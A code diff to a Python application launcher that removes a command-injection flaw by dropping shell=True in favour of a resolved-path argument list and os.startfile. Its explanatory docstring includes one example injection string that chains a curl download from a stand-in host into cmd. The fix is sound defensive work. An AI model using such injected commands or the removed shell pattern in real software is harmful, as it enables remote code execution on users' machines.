@@ -1,3 +1,4 @@
+import os
 import time
 import subprocess
 import platform
@@ -72,12 +73,33 @@ def _normalize(raw: str) -> str:
     return raw  
 
 def _launch_windows(app_name: str) -> bool:
+    """Start a program by its RESOLVED PATH. Never through a shell.
 
-    if shutil.which(app_name) or shutil.which(app_name.split(".")[0]):
+    WHY `shell=True` HAD TO GO, EVEN THOUGH THE NAME LOOKS SAFE.
+    ------------------------------------------------------------
+    It used to call `subprocess.Popen(app_name, shell=True)`. That hands the
+    string to `cmd.exe`, where `&`, `|`, `>` and `&&` stop being characters in a
+    name and start being syntax. An application name reaches this function from
+    a sentence the user typed and, on the model path, from something a language
+    model produced -- so "notepad & curl evil.sh | cmd" would have been two
+    commands, not one filename.
+
+    Nothing here needs a shell. `shutil.which` already resolves the name to a
+    real executable path, and passing that path as a single-element ARGUMENT
+    LIST means the operating system executes exactly that file. Metacharacters
+    become what they always should have been: characters in a string that does
+    not match any program.
+
+    The `start` fallback for URIs is gone with it. `start` is a cmd builtin and
+    cannot be run without a shell, and a shell is the thing being removed --
+    `os.startfile` performs the same shell-verb open through the Windows API,
+    with no command line to inject into.
+    """
+    resolved = shutil.which(app_name) or shutil.which(app_name.split(".")[0])
+    if resolved:
         try:
             subprocess.Popen(
-                app_name,
-                shell=True,
+                [resolved],
                 stdout=subprocess.DEVNULL,
                 stderr=subprocess.DEVNULL,
             )
@@ -87,8 +109,10 @@ def _launch_windows(app_name: str) -> bool:
             print(f"[open_app] subprocess failed: {e}")
 
     if ":" in app_name:
+        # A URI or a shell verb ("ms-settings:", "shell:AppsFolder\..."). The
+        # Windows API opens these directly; there is no command line involved.
         try:
-            subprocess.Popen(f"start {app_name}", shell=True)
+            os.startfile(app_name)  # noqa: S606 - no shell, no argument string
             time.sleep(1.0)
             return True
         except Exception:
